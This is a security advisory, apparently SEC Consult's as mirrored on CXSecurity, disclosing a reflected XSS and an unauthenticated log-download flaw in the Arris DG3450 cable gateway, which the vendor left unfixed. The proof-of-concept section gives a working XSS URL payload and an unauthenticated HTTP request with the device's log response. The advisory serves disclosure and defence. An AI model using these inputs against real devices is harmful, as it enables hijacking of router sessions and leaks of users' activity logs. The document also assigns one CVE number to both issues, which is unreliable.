---
title: Arris DG3450 AR01.02.056.18_041520_711.NCS.10 XSS / Missing Authentication
url: https://cxsecurity.com/issue/WLB-2023030019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-09
fetch_date: 2025-10-04T08:59:16.260670
---

# Arris DG3450 AR01.02.056.18_041520_711.NCS.10 XSS / Missing Authentication

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Arris DG3450 AR01.02.056.18\_041520\_711.NCS.10 XSS / Missing Authentication** **2023.03.08**  Credit:  **[Steffen Robertz](https://cxsecurity.com/author/Steffen%2BRobertz/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-27572](https://cxsecurity.com/cveshow/CVE-2023-27572/ "Click to see CVE-2023-27572")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

SEC Consult Vulnerability Lab Security Advisory < 20230306-0 >
=======================================================================
title: Multiple Vulnerabilities
product: Arris DG3450 Cable Gateway
vulnerable version: AR01.02.056.18\_041520\_711.NCS.10
fixed version: -
CVE number: CVE-2023-27571, CVE-2023-27572
impact: medium
homepage: https://www.commscope.com
found: 2022-10-21
by: S. Robertz (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
Arris has been aquired by CommScope in 2019.
"At CommScope we push the boundaries of communications technology to
create the world’s most advanced networks. We design, manufacture,
install and support the hardware infrastructure and software
intelligence that enable our digital society to interact and thrive.
Working with customers, we advance broadband, enterprise and wireless
networks to power progress and create lasting connections.
Across the globe, our people and solutions are redefining connectivity,
solving today’s challenges and driving the innovation that will meet
the needs of what’s next."
Source: https://www.commscope.com/about-us/
Business recommendation:
------------------------
The vendor did not reply to any of our communication attempts. The security
issues have not been fixed. Users of this product are urged to contact their
support representative and request the vulnerabilities to be fixed.
SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.
Vulnerability overview/description:
-----------------------------------
1) Reflected Cross-Site-Scripting Vulnerability (CVE-2023-27572)
An attacker can execute arbitrary JavaScript code in the context of the
victim's session, thus perform all actions, exfiltrate information, etc. In
order to exploit this vulnerability the attacker will have to trick the user
into visiting a manipulated URL.
2) Missing Authentication (CVE-2023-27572)
Logfiles can be downloaded without prior authentication, once the correct URL
is known. This allows an attacker to gain further information about the usage
of the device.
Proof of concept:
-----------------
1) Reflected Cross-Site-Scripting Vulnerability (CVE-2023-27572)
The following URL has to be visited by the victim in order to execute arbitrary
JavaScript code.
http://$IP/https\_redirect.php?page=%22;alert(document.domain);var%20dummy=%22
2) Missing Authentication (CVE-2023-27572)
The following HTTP request will return the log file of the device without
checking for a valid session cookie.
-------------------
GET /troubleshooting\_logs\_download.php?log\_type=system&time\_frame=today HTTP/1.1
Host: $IP
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Set-Cookie: PHPSESSID=38b5a65ba1a4477e29efd73ee1e01554; path=/; HttpOnly
X-XSS-Protection: 1; mode=block
strict-transport-security: max-age=600; includeSubDomains
Server: ARRIS Server
X-Frame-Options: DENY
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; worker-src blob:
Cache-control: private
Pragma: private
Expires: 0
Content-type: text/plain;charset=utf-8
Content-Disposition: attachment; filename="troubleshooting\_logs\_system\_today.txt"
Content-Transfer-Encoding: binary
Accept-Ranges: bytes
Content-Length: 437
Date: Tue, 21 Jun 2022 20:51:07 GMT
GUI: User:admin login
06/15/2022 22:46:56 Notice
GUI: User:admin logout
06/15/2022 22:42:14 Notice
GUI: User:admin logout
06/15/2022 22:41:26 Notice
GUI: User:admin logout
06/15/2022 22:41:06 Notice
GUI: User:admin logout
06/15/2022 22:40:47 Notice
GUI: User:admin login
06/15/2022 22:33:22 Notice
GUI: User:admin logout
06/15/2022 22:31:51 Notice
-------------------
Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been tested on the following device / firmware:
\* Arris DG3450 with software version AR01.02.056.18\_041520\_711.NCS.10
Vendor contact timeline:
------------------------
2022-11-22: Contacting vendor through TAC.helpdesk@commscope.com; no response.
2022-12-05: Asking for security contact through @Arris Twitter social media
No response. Received "You can no longer send messages to this person"
after initial message.
2022-12-05: Contacting vendor via privacycontact@commscope.com; no response.
2023-01-24: Contacting vendor again via privacycontact@commscope.com and
TAC.helpdesk@commscope.com; no response
2023-03-02: Requesting CVE numbers.
2023-03-06: Release of security advisory.
Solution:
---------
The vendor did not reply to any of our communication attempts. The security
issues have not been fixed. Users of this product are urged to contact their
support representative and request the vulnerabilities to be fixed.
Workaround:
-----------
None
Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Vulnerability Lab
SEC Consult, an Atos company
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about...